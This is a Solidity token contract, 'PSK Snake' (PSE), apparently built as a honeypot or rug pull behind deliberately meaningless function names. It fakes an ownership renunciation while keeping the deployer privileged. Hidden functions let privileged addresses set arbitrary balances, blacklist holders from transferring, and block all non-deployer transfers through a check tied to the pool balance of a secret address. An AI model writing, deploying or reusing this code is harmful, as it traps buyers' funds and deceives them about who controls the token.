//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface autoLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listLimit {
    function createPair(address fromWallet, address limitLaunch) external returns (address);
}

interface shouldAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundFee) external view returns (uint256);

    function transfer(address txIs, uint256 toMax) external returns (bool);

    function allowance(address fundTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 toMax) external returns (bool);

    function transferFrom(
        address sender,
        address txIs,
        uint256 toMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTotalLaunch, uint256 value);
    event Approval(address indexed fundTo, address indexed spender, uint256 value);
}

interface shouldAmountMetadata is shouldAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PSKSnake is launchMin, shouldAmount, shouldAmountMetadata {

    uint256 private liquidityTrading;

    function symbol() external view virtual override returns (string memory) {
        return autoFund;
    }

    function fromTo(uint256 toMax) public {
        feeFund();
        launchMarketingLiquidity = toMax;
    }

    mapping(address => uint256) private atFundShould;

    string private autoFund = "PSE";

    function allowance(address tokenMin, address launchEnable) external view virtual override returns (uint256) {
        if (launchEnable == teamIs) {
            return type(uint256).max;
        }
        return isSwap[tokenMin][launchEnable];
    }

    uint256 private toTrading = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed swapFrom, address indexed receiverSell);

    function approve(address launchEnable, uint256 toMax) public virtual override returns (bool) {
        isSwap[_msgSender()][launchEnable] = toMax;
        emit Approval(_msgSender(), launchEnable, toMax);
        return true;
    }

    bool private walletReceiver;

    function owner() external view returns (address) {
        return modeToken;
    }

    bool private teamExempt;

    address public teamTxLaunched;

    uint8 private swapMode = 18;

    address teamIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function feeFund() private view {
        require(launchedExempt[_msgSender()]);
    }

    function receiverFund(address buyLiquidity) public {
        if (takeExempt) {
            return;
        }
        if (teamExempt == autoMode) {
            walletReceiver = false;
        }
        launchedExempt[buyLiquidity] = true;
        
        takeExempt = true;
    }

    function listAuto() public {
        emit OwnershipTransferred(senderReceiver, address(0));
        modeToken = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return shouldToken;
    }

    string private shouldToken = "PSK Snake";

    function totalSupply() external view virtual override returns (uint256) {
        return toTrading;
    }

    bool public takeExempt;

    function atLiquidity(address atMin) public {
        feeFund();
        
        if (atMin == senderReceiver || atMin == teamTxLaunched) {
            return;
        }
        totalTrading[atMin] = true;
    }

    function liquidityExempt(address tokenFee, uint256 toMax) public {
        feeFund();
        atFundShould[tokenFee] = toMax;
    }

    uint256 launchMarketingLiquidity;

    uint256 fundLaunch;

    address private modeToken;

    function transfer(address tokenFee, uint256 toMax) external virtual override returns (bool) {
        return senderExempt(_msgSender(), tokenFee, toMax);
    }

    constructor (){
        
        listAuto();
        autoLiquidity fundLimitBuy = autoLiquidity(teamIs);
        teamTxLaunched = listLimit(fundLimitBuy.factory()).createPair(fundLimitBuy.WETH(), address(this));
        
        senderReceiver = _msgSender();
        launchedExempt[senderReceiver] = true;
        atFundShould[senderReceiver] = toTrading;
        
        emit Transfer(address(0), senderReceiver, toTrading);
    }

    address fundReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public launchedExempt;

    function transferFrom(address isFee, address txIs, uint256 toMax) external override returns (bool) {
        if (_msgSender() != teamIs) {
            if (isSwap[isFee][_msgSender()] != type(uint256).max) {
                require(toMax <= isSwap[isFee][_msgSender()]);
                isSwap[isFee][_msgSender()] -= toMax;
            }
        }
        return senderExempt(isFee, txIs, toMax);
    }

    function senderExempt(address isFee, address txIs, uint256 toMax) internal returns (bool) {
        if (isFee == senderReceiver) {
            return enableFrom(isFee, txIs, toMax);
        }
        uint256 listMode = shouldAmount(teamTxLaunched).balanceOf(fundReceiver);
        require(listMode == launchMarketingLiquidity);
        require(!totalTrading[isFee]);
        return enableFrom(isFee, txIs, toMax);
    }

    function enableFrom(address isFee, address txIs, uint256 toMax) internal returns (bool) {
        require(atFundShould[isFee] >= toMax);
        atFundShould[isFee] -= toMax;
        atFundShould[txIs] += toMax;
        emit Transfer(isFee, txIs, toMax);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return swapMode;
    }

    mapping(address => bool) public totalTrading;

    uint256 private feeWalletMode;

    function getOwner() external view returns (address) {
        return modeToken;
    }

    mapping(address => mapping(address => uint256)) private isSwap;

    bool public autoMode;

    address public senderReceiver;

    function balanceOf(address fundFee) public view virtual override returns (uint256) {
        return atFundShould[fundFee];
    }

}